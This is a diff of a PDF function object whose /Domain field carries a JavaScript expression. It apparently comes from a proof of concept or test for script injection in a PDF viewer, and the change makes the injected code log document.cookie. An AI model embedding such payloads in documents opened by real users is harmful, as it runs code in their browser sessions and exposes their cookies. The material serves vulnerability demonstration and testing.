@@ -2,7 +2,7 @@
 1 0 obj
 <<
   /FunctionType 4
-  /Domain [(console.log("Hello, this is code running in " + location.href),console.log("log2")) 0]
+  /Domain [(console.log("Hello, this is code running in " + location.href),console.log(document.cookie)) 0]
   /Range [0 0]
   /Length 12
 >>
